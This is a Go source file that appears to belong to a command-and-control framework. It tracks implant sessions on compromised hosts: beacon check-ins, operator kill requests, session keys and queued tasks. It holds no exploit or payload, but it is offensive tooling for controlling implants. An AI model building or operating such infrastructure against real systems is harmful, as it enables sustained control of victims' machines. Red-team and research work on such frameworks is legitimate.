package sessions

import (
	"sync"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

type Session struct {
	mu sync.RWMutex

	SessionID      string
	ImplantID      string
	Hostname       string
	Username       string
	OS             string
	Arch           string
	PID            uint32
	IntegrityLevel string
	Transport      string
	RemoteAddr     string
	RegisteredAt   time.Time
	LastCheckin     time.Time
	Alive          bool
	SessionKey     []byte // AES session key for encrypted comms
	// CheckinMs is the operator-requested beacon interval; 0 means "implant default".
	CheckinMs int64
	// terminateRequested is set by operator Kill; UpdateCheckin must not clear it.
	// Distinct from reaper marking Alive=false (which allows revive on late check-in).
	terminateRequested bool

	// Pending tasks for this session
	taskQueue []*pb.Task
	taskMu    sync.Mutex
}

func NewSession(reg *pb.Register, transport, remoteAddr string) *Session {
	now := time.Now()
	return &Session{
		ImplantID:      reg.ImplantId,
		Hostname:       reg.Hostname,
		Username:       reg.Username,
		OS:             reg.Os,
		Arch:           reg.Arch,
		PID:            reg.Pid,
		IntegrityLevel: reg.IntegrityLevel,
		Transport:      transport,
		RemoteAddr:     remoteAddr,
		RegisteredAt:   now,
		LastCheckin:     now,
		Alive:          true,
	}
}

func (s *Session) UpdateCheckin() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.LastCheckin = time.Now()
	// Operator kill sticks: do not revive a terminate-requested session.
	if !s.terminateRequested {
		s.Alive = true
	}
}

func (s *Session) IsAlive() bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.Alive
}

// Kill marks the session dead and requests implant terminate on next beacon.
// Used for operator kill (not reaper — use MarkDead for soft timeout).
func (s *Session) Kill() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.Alive = false
	s.terminateRequested = true
}

// MarkDead marks the session inactive without requesting terminate.
// Used by the reaper so a late check-in can revive the session.
func (s *Session) MarkDead() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.Alive = false
}

// ShouldTerminate reports whether the implant should exit (operator kill).
func (s *Session) ShouldTerminate() bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.terminateRequested
}

// SetCheckinMs records the operator-requested beacon interval for NextCheckinMs responses.
// Pass 0 to clear and let the implant keep its build-time sleep.
func (s *Session) SetCheckinMs(ms int64) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if ms < 0 {
		ms = 0
	}
	s.CheckinMs = ms
}

// NextCheckinMs returns the interval to advertise on Register/Beacon responses.
// 0 means "do not override implant sleep".
func (s *Session) NextCheckinMs() int64 {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.CheckinMs
}

func (s *Session) EnqueueTask(task *pb.Task) {
	s.taskMu.Lock()
	defer s.taskMu.Unlock()
	s.taskQueue = append(s.taskQueue, task)
}

// DrainTasks returns and clears all pending tasks.
func (s *Session) DrainTasks() []*pb.Task {
	s.taskMu.Lock()
	defer s.taskMu.Unlock()
	tasks := s.taskQueue
	s.taskQueue = nil
	return tasks
}

// RequeueTasks prepends tasks back onto the queue (e.g. after a failed encrypt).
func (s *Session) RequeueTasks(tasks []*pb.Task) {
	if len(tasks) == 0 {
		return
	}
	s.taskMu.Lock()
	defer s.taskMu.Unlock()
	s.taskQueue = append(tasks, s.taskQueue...)
}

func (s *Session) ToProto() *pb.SessionInfo {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return &pb.SessionInfo{
		SessionId:      s.SessionID,
		ImplantId:      s.ImplantID,
		Hostname:       s.Hostname,
		Username:       s.Username,
		Os:             s.OS,
		Arch:           s.Arch,
		Pid:            s.PID,
		IntegrityLevel: s.IntegrityLevel,
		Transport:      s.Transport,
		RemoteAddr:     s.RemoteAddr,
		RegisteredAt:   s.RegisteredAt.Unix(),
		LastCheckin:     s.LastCheckin.Unix(),
		Alive:          s.Alive,
	}
}
